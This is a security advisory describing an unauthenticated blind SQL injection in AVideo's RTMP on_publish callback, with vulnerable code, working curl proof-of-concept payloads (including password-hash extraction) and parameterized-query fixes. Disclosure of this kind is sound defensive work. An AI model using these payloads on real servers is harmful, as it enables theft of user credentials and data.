# [H] AVideo has an Unauthenticated Blind SQL Injection in RTMP on_publish Callback via Stream Name Parameter

## Summary
Severity: High
Advisory: GHSA-8p58-35c3-ccxx
CVE: CVE-2026-33485
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-8p58-35c3-ccxx
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The RTMP `on_publish` callback at `plugin/Live/on_publish.php` is accessible without authentication. The `$_POST['name']` parameter (stream key) is interpolated directly into SQL queries in two locations — `LiveTransmitionHistory::getLatest()` and `LiveTransmition::keyExists()` — without parameterized binding or escaping. An unauthenticated attacker can exploit time-based blind SQL injection to extract all database contents including user password hashes, email addresses, and other sensitive data.

## Details

**Entry point:** `plugin/Live/on_publish.php` — no authentication, no IP allowlist, no origin verification.

**Sanitization (insufficient):** Line 117 strips only `&` and `=` characters:
```php
// plugin/Live/on_publish.php:117
$_POST['name'] = preg_replace("/[&=]/", '', $_POST['name']);
```

**Injection point #1 — unconditional (no `p` parameter needed):**

At line 120, `$_POST['name']` is passed directly to `LiveTransmitionHistory::getLatest()`:
```php
// plugin/Live/on_publish.php:120
$activeLive = LiveTransmitionHistory::getLatest($_POST['name'], $live_servers_id, ...);
```

Inside `getLatest()`, the key is interpolated into a LIKE clause without escaping:
```php
// plugin/Live/Objects/LiveTransmitionHistory.php:494-495
if (!empty($key)) {
    $sql .= " AND lth.`key` LIKE '{$key}%' ";
}
```

**Injection point #2 — when `$_GET['p']` is provided:**

At line 146, `$_POST['name']` is passed to `LiveTransmition::keyExists()`:
```php
// plugin/Live/on_publish.php:146
$obj->row = LiveTransmition::keyExists($_POST['name']);
```

Inside `keyExists()`, `cleanUpKey()` is called (which only strips adaptive/playlist/sub suffixes — no SQL escaping), then the key is interpolated directly:
```php
// plugin/Live/Objects/LiveTransmition.php:298-303
$key = Live::cleanUpKey($key);
$sql = "SELECT u.*, lt.*, lt.password as live_password FROM " . static::getTableName() . " lt "
        . " LEFT JOIN users u ON u.id = users_id AND u.status='a' "
        . " WHERE  `key` = '$key' ORDER BY lt.modified DESC, lt.id DESC LIMIT 1";
$res = sqlDAL::readSql($sql);
```

**Why `readSql()` provides no protection:** When called without format/values parameters (as in both cases above), `sqlDAL::readSql()` passes the full SQL string — with the injection payload already embedded — to `$global['mysqli']->prepare()`. Since there are no placeholders (`?`) and no bound parameters, `prepare()` simply compiles the injected SQL as-is. The `eval_mysql_bind()` function returns `true` immediately when formats/values are empty.

## PoC

**Injection point #1 (unconditional — simplest):**

```bash
# Time-based blind SQLi via getLatest() — no p parameter needed
curl -s -o /dev/null -w "%{time_total}" \
  -X POST "http://TARGET/plugin/Live/on_publish.php" \
  -d "tcurl=rtmp://localhost/live&name=' OR (SELECT SLEEP(5)) %23"
```

A ~5-second response time confirms injection. The payload:
- Avoids `&` and `=` (stripped by line 117)
- Avoids `_` and `-` in positions where `cleanUpKey()` would split
- Uses `%23` (`#`) to comment out the trailing `%'`

**Data extraction — character-by-character:**

```bash
# Extract first character of admin password hash
curl -s -o /dev/null -w "%{time_total}" \
  -X POST "http://TARGET/plugin/Live/on_publish.php" \
  -d "tcurl=rtmp://localhost/live&name=' OR (SELECT SLEEP(5) FROM users WHERE id=1 AND SUBSTRING(password,1,1)='\\$') %23"
```

**Injection point #2 (via keyExists):**

```bash
curl -s -o /dev/null -w "%{time_total}" \
  -X POST "http://TARGET/plugin/Live/on_publish.php" \
  -d "tcurl=rtmp://localhost/live?p=test&name=' OR (SELECT SLEEP(5)) %23"
```

This reaches `keyExists()` at line 146, producing:
```sql
SELECT u.*, lt.*, lt.password as live_password FROM live_transmitions lt
LEFT JOIN users u ON u.id = users_id AND u.status='a'
WHERE `key` = '' OR (SELECT SLEEP(5)) #' ORDER BY lt.modified DESC, lt.id DESC LIMIT 1
```

## Impact

An unauthenticated remote attacker can:

1. **Extract all database contents** via time-based blind SQL injection, including:
   - User password hashes (bcrypt)
   - Email addresses and personal information
   - API keys, session tokens, and live stream passwords
   - Site configuration and secrets stored in database tables

2. **Authenticate as any user to the streaming system** — extracted password hashes can be used directly as the `$_GET['p']` parameter since `on_publish.php:153` compares `$_GET['p'] === $user->getPassword()` against the raw stored hash, allowing the attacker to start streams impersonating any user.

3. **Enumerate database structure** — the injection can be used to query `information_schema` tables, mapping the entire database for further exploitation.

The first injection point (via `getLatest()`) is reached unconditionally on every request — no additional parameters beyond `name` and `tcurl` are required.

## Recommended Fix

Use parameterized queries in both affected functions:

**Fix `LiveTransmition::keyExists()` at `plugin/Live/Objects/LiveTransmition.php:298-303`:**
```php
$key = Live::cleanUpKey($key);
$sql = "SELECT u.*, lt.*, lt.password as live_password FROM " . static::getTableName() . " lt "
        . " LEFT JOIN users u ON u.id = users_id AND u.status='a' "
        . " WHERE  `key` = ? ORDER BY lt.modified DESC, lt.id DESC LIMIT 1";
$res = sqlDAL::readSql($sql, "s", [$key]);
```

**Fix `LiveTransmitionHistory::getLatest()` at `plugin/Live/Objects/LiveTransmitionHistory.php:494-495`:**
```php
if (!empty($key)) {
    $sql .= " AND lth.`key` LIKE ? ";
    $formats .= "s";
    $values[] = $key . '%';
}
```

**Fix `LiveTransmitionHistory::getLatestFromKey()` at `plugin/Live/Objects/LiveTransmitionHistory.php:681-688`:**
```php
if(!$strict){
    $parts = Live::getLiveParametersFromKey($key);
    $key = $parts['cleanKey'];
    $sql .= " `key` LIKE ? ";
    $formats = "s";
    $values = [$key . '%'];
}else{
    $sql .= " `key` = ? ";
    $formats = "s";
    $values = [$key];
}
```

All three fixes use the existing `sqlDAL::readSql()` parameterized binding support (`"s"` format for string, values array) which is already used elsewhere in the codebase.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-8p58-35c3-ccxx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33485
- https://github.com/WWBN/AVideo/commit/af59eade82de645b20183cc3d74467a7eac76549
- https://github.com/WWBN/AVideo
